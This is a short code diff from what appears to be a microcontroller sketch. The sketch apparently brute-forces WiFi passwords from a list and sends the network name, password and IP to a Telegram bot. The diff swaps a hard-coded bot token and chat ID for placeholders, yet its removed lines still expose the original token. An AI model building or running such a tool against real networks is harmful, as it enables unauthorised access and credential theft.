@@ -17,8 +17,8 @@ void sendToTelegram(String ssid, const char* pass, String ip);
 String urlencode(String str);
 
 // === Telegram Info ===
-const char* botToken = "7368406071:AAGkXw-AThfdPCKEV6gXqTAElVX4zV-ASZg";
-const char* chatID = "5316471518";
+const char* botToken = "BOT TOKEN";
+const char* chatID = "USER ID";
 
 // === Password List ===
 const char* passwords[] = {
